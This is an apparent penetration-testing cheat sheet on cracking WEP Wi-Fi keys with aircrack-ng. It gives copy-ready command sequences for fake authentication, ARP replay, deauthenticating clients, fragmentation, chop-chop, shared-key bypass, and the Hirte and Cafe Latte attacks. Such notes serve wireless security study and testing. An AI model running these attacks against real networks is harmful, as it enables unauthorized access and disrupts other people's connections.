# WEP Cracking

## Cracking WEP with Connected Clients

### Theory

**Fake Authentication**
The fake authentication attack allows you to associate to an access point. This attack is useful in scenarios where there are no associated clients and you need to fake an authentication to the AP. Note that the fake authentication attack does **not** generate ARP packets so don't try to use this attack to capture ARP files.

> If fake authentication is never successful, MAC address filtering may be in use. The AP will only accept connections from specific MAC addresses. In this case, you will need to obtain a **valid** MAC address by observing traffic using airodump-ng and impersonate it once the client goes offline. **Do not** attempt to perform a fake authentication attack for a specific MAC address if the client is still active on the AP.

**ARP Replay Attack**
The attack listens for an ARP packet and then retransmits it back to the access point. This causes the AP to repeat the ARP packet with a new IV. By collecting enough of these IVs, aircrack-ng can be used to crack the WEP key.

**Deauthentication Attack**
After a client is deauthenticated, it will reconnect to the wireless network. During the reconnection stage, there is a high probability that an ARP packet will be sent to the AP. Replaying these ARP packets will help us force the access point to generate a large number of weak initialization vectors.

On WPA/WPA2 networks, the client needs to reauthenticate as it reconnects to the network, allowing us to capture the 4-way handshake.

### Steps

**1. Start Capture**
```bash
# Packet Capture
airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $PCAP_FILE $IFACE

# Get your MAC address
macchanger --show <INTERFACE>
```

**2. Accelerate the IV capture using Fake Authentication + ARP Request Replay Attack + Deauthenticate User. Stop Airodump at ~100.000 different IVs**
```bash
# Fake authentication attack
aireplay-ng -1 0 -e $AP_NAME -a $AP_MAC -h $MY_MAC $IFACE

# ARP Replay Attack
aireplay-ng -3 -b $AP_MAC -h $MY_MAC $IFACE

# Deauthentication Attack
aireplay-ng -0 1 -a $AP_MAC -c $STATION_MAC $IFACE
```

**3. Crack the password using Aircrack-ng**
```bash
aircrack-ng $PCAP_FILE
```

### If crack doesn't work

**Fudge factor**
The fudge factor tells Aircrack-ng how broadly to brute force key spaces. The larger the fudge factor, the more possibilities Aircrack-ng will try to brute force.

```bash
aircrack-ng -f <FUDGE> <CAPTURE_NAME>
```

**Dictionary attack**
```bash
aircrack-ng -w <PASSWORDS_WORDLIST> <CAPTURE_NAME>
```

---

## Cracking WEP via a Client

> Why leverage a wireless client instead of the AP?
> - Some APs max out at 130k unique IVs
> - Some APs impose client-to-client controls
> - MAC address access controls
> - APs that eliminate weak IVs
> - You can't successfully do a fake authentication to the AP
> - You are within range of the client but not the AP itself

```bash
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Get your MAC address
macchanger --show <INTERFACE>

# Fake authentication attack
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# Interactive packet replay attack
aireplay-ng -2 -b <BSSID> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <INTERFACE>

# or with a capture file
aireplay-ng -2 -r replay_src-<FILE_NAME>.cap <INTERFACE>

# Crack
aircrack-ng <CAPTURE_NAME>
```

---

## Cracking Clientless WEP Networks

**Assumptions:**
- You are close enough to the AP to send and receive packets. Just because you are close enough to receive packets does not necessarily mean you will be able to transmit packets to the access point.
- There are some data packets coming from the AP. Beacons and management frames are useless for these attacks. A quick way to check for data packets is to run Airodump-ng and see if the #Data field is increasing.
- The AP is using WEP **open authentication**. If it is running **shared key** authentication, the only way to execute this attack is to use a previously captured PRGA XOR handshake.

### Fragmentation Attack

```bash
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Get your MAC address
macchanger --show <INTERFACE>

# Fake authentication attack
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# Fragmentation attack
aireplay-ng -5 -b <BSSID> -h <YOUR_MAC> <INTERFACE>

# Forging ARP packet with the xor packet from fragmentation attack
packetforge-ng -0 -a <BSSID> -h <YOUR_MAC> -k 255.255.255.255 -l 255.255.255.255 -y <FRAG_FILE.xor>

# Interactive packet replay attack with the forged ARP packet
aireplay-ng -2 -r <ARP_PACKET_NAME> <INTERFACE>

# Crack
aircrack-ng <CAPTURE_NAME>
```

### Chop Chop Attack

```bash
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Get your MAC address
macchanger --show <INTERFACE>

# Fake authentication attack
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# Chop chop attack
aireplay-ng -4 -b <BSSID> -h <YOUR_MAC> <INTERFACE>

# Forging ARP packet with the xor packet from chop chop attack
packetforge-ng -0 -a <BSSID> -h <YOUR_MAC> -k 255.255.255.255 -l 255.255.255.255 -y <CHOP_FILE.xor>

# Interactive packet replay attack with the forged ARP packet
aireplay-ng -2 -r <ARP_PACKET_NAME> <INTERFACE>

# Crack
aircrack-ng <CAPTURE_NAME>
```

---

## Bypassing WEP Shared Key Authentication

> Shared key authentication requires that the station and AP both have the same WEP key in order to authenticate. If you try to run a fake authentication attack against a WEP network using shared authentication, you will receive an error from Aireplay. The AUTH column will not display SKA until a wireless client authenticates to the network so when you first start sniffing a network, you may not realize it is using shared key authentication until you attempt to run the fake authentication attack against it.

We will run a deauthentication attack against our connected victim client, you can also use the PRGA XOR file obtained via a chopchop or fragmentation attack but it is far faster and easier to deauthenticate a connected client.

```bash
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Get your MAC address
macchanger --show <INTERFACE>

# Fake authentication attack (It should fail)
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# Deauthentication attack (If there is a client)
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# Fake shared key authentication using the XOR keystream
aireplay-ng -1 60 -e <ESSID> -y wepshared-<NAME>.xor -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# ARP replay attack
aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> <INTERFACE>

# Deauthentication attack (If there is a client)
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# Crack
aircrack-ng <CAPTURE_NAME>
```

---

## HIRTE Attack

> Steps:
> 1. Setup a fake WEP AP and wait for a client to connect
> 2. Upon connection of a client waits for auto-configuration IP address
> 3. Client sends an ARP packet
> 4. Obtain the ARP packet and convert it into an ARP request for the same client (relocates IP address in ARP header using fragmentation)
> 5. Client replies
> 6. Collect these packets
> 7. Crack the WEP key

```bash
# Creation of Fake Access Point
airbase-ng -c 1 --essid "Nama ESSID" -W 1 -N <interface>
# -c = Channel
# -W = Encryption Bit
# -N = Interface

# Packet Capture
airodump-ng --channel 1 <interface> --write Hirte

# Cracking Credentials
aircrack-ng Hirte.cap
```

**References:**
- https://pentestlab.blog/2015/02/03/hirte-attack/
- https://0xd4y.com/2023/01/19/Wi-Fi-Pentesting-Notes/#4c31a3bb-313c-472d-a844-76f9932c8406

---

## Cafe Latte Attack

```bash
aireplay-ng -6 -h <our-card-MAC-Address> -b <access-point> -D <interface>
```

**Explain:**
- `-6` = Cafe-Latte Attack
- `-h` = Our card MAC Address
- `-b` = Access Point MAC
- `-D` = Disables AP detection

**Reference:** https://www.aircrack-ng.org/doku.php?id=cafe-latte
